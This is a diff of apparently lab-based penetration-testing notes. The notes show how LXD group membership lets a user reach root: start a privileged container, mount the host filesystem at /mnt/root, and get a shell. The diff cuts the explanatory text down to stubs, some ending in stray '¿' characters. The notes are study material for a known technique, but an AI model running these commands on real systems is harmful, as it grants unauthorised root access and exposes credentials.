@@ -1,5 +1,5 @@
 # LXC / LXD
-LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.
+LXD is similar to Docker and is Ubuntu's container manager.¿
 
 Unzip the Alpine image.
 
@@ -11,9 +11,7 @@ extracting: 64-bit Alpine/alpine.tar.gz
 inflating: 64-bit Alpine/alpine.tar.gz.root  
 cd 64-bit\ Alpine/
 ```
-Start the LXD initialization process. 
-Choose the defaults for each prompt. 
-Consult this post for more information on each step.
+Start the LXD initialization process. ¿
 ```
 devops@NIX02:~$ lxd init
 ```
@@ -27,16 +25,13 @@ Start a privileged container with the security.privileged set to true to run the
 devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
 ```
 Creating r00t
-
 Mount the host file system.
 
 ```
 devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
 ```
 Device mydev added to r00t
-
-Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
-
+Find in /mnt/root/root
 ```
 devops@NIX02:~$ lxc start r00t
 devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
